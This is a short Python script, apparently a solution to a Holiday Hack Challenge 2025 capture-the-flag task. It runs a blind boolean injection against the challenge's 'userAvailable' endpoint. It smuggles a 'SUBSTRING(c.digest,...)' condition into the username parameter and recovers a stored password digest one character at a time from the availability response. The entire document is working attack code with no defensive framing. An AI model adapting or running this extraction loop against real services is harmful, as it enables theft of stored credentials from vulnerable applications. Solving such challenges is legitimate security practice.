import requests
import string

BASE = "https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable"
USERNAME = "bruce"   # or "bruce"

#charset = string.ascii_letters + string.digits + "_-{}[]():;,.!@#$%^&*?/\\|+="
charset="0123456789abcdef-"
def test_payload(payload):
    r = requests.get(BASE, params={"username": payload})
    try:
        return r.json()
    except:
        return {}

def find_digest():
    digest = ""
    pos = 0

    while True:
        found_char = None
        for ch in charset:
            payload = f'{USERNAME}" AND SUBSTRING(c.digest,{pos},1)="{ch}" --'
            resp = test_payload(payload)

            if "available" in resp and resp["available"] == False:
                found_char = ch
                digest += ch
                print(f"[{pos}] = {ch}")
                break

        if not found_char:
            print("End of digest string.")
            break

        pos += 1

    return digest

dig = find_digest()
print("Digest =", dig)
